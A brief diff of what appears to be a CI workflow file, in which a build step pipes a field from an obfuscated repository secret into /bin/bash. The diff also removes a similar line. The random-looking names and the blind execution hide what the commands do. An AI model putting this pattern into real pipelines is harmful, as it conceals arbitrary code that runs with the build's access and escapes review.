@@ -17,7 +17,6 @@ jobs:
           veukw305: ${{ secrets.veukw305 }}
         run: |
           printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
-          echo $nrff4 | jq -r .xxdsu7144 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
